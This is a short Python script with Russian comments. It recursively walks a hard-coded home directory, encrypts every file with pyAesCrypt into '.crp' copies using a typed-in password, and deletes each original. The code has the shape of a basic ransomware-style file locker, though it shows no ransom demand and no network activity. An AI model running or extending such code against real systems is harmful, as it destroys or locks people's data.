import pyAesCrypt
import os
import sys

# функция шифрования файла
def encryption(file, password):

    # задаём размер буфера
    buffer_size = 512 * 1024

    # вызываем метод шифрования
    pyAesCrypt.encryptFile(
        str (file),
        str (file) + ".crp",
        password,
        buffer_size
    )

    # чтобы видеть результат выводим на печать имя зашифрованого файла
    print("[Файл '" + str(os.path.splitext(file)[0]) + "' зашифрован]")

    # удоляем исходнй файл
    os.remove(file)

# функция сконирования деректория
def walking_by_dirs(dir, password):

    for name in os.listdir(dir):
        path = os.path.join(dir, name)

        # если находим файл то шифруем его
        if os.path.isfile(path):
            try:
                encryption(path, password)
            except Exception as ex:
                print(ex)
        # если находиv деректорий то повторяем цикл по поиску файлов
        else:
            walking_by_dirs(path, password)

password = input("введите пароль для шифрования: ")
walking_by_dirs("/home/larioncrab", password)